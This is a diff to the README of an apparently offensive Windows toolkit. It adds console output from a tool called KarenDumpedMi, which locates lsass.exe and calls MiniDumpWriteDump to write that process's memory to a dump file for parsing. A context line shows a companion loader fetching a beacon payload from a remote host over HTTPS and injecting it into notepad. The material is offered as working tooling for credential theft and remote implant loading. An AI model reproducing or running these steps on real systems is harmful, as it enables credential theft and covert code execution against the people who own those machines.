@@ -98,5 +98,32 @@ C:\>KarenLdr.exe -u "https://192.168.231.128:443/beacon.bin" -t notepad -p 9524 
 ```
 
 ## KarenDumpedMi
+```
+C:\Users\Wesley\source\repos\KarenDumpedMi\KarenDumpedMi\bin\Debug>KarenDumpedMi.exe
+
+     _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
+    | \    /\(  ___  )(  ____ )(  ____ \( (    /|(  __  \ |\     /|(       )(  ____ )(  ____ \(  __  \ (       )\__   __/
+    |  \  / /| (   ) || (    )|| (    \/|  \  ( || (  \  )| )   ( || () () || (    )|| (    \/| (  \  )| () () |   ) (
+    |  (_/ / | (___) || (____)|| (__    |   \ | || |   ) || |   | || || || || (____)|| (__    | |   ) || || || |   | |
+    |   _ (  |  ___  ||     __)|  __)   | (\ \) || |   | || |   | || |(_)| ||  _____)|  __)   | |   | || |(_)| |   | |
+    |  ( \ \ | (   ) || (\ (   | (      | | \   || |   ) || |   | || |   | || (      | (      | |   ) || |   | |   | |
+    |  /  \ \| )   ( || ) \ \__| (____/\| )  \  || (__/  )| (___) || )   ( || )      | (____/\| (__/  )| )   ( |___) (___
+    |_/    \/|/     \||/   \__/(_______/|/    )_)(______/ (_______)|/     \||/       (_______/(______/ |/     \|\_______/
+
+[>] Finding Alive Process
+    |-> Found lsass.exe
+    |-> PID: 920
+
+[>] Finding MiniDumpWriteDump
+    |-> Location of MiniDumpWriteDump(): 0x7FFD7E8F6C50
+
+[>] Getting Handles
+    |-> Process Handle: 0x2CC
+    |-> File Handle (karen.dmp): 0x2C4
+
+[>] Invoking MiniDumpWriteDump
+    |-> Successfully Called MiniDumpWriteDump()
+    |-> COMPLETED! You can now parse karen.dmp!
+```
 
 ## Karen2Gadget
